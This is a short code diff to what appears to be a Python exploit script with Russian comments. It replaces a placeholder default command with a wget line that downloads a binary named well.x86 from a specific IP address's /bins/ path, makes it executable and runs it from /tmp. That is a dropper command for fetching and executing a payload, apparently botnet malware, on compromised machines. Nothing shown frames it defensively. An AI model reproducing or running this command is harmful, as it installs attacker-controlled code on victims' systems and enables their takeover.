@@ -99,7 +99,7 @@ def main():
     print()
     
     # Настройки по умолчанию (как в Ruby коде)
-    default_command = "wget http://your-server/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"
+    default_command = "wget http://84.200.81.239/bins/well.x86 -O /tmp/well.x86 && chmod +x /tmp/well.x86 && /tmp/well.x86"
     default_vector = "URN"
     
     # Проверка аргументов
